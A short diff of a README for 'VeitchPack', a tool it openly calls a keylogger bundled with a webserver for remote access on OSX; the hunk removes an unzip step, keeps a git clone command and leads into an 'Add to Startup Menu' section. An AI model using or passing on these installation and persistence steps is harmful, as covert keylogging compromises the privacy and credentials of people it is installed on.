@@ -5,7 +5,6 @@ A keylogger bundled with a webserver. For remote access goodies on OSX... best d
 ### Download ###
 ~~~~
 git clone https://github.com/Gangster45671/VeitchPack.git
-unzip VeitchPack.zip
 ~~~~
 
 ### Add to Startup Menu ###
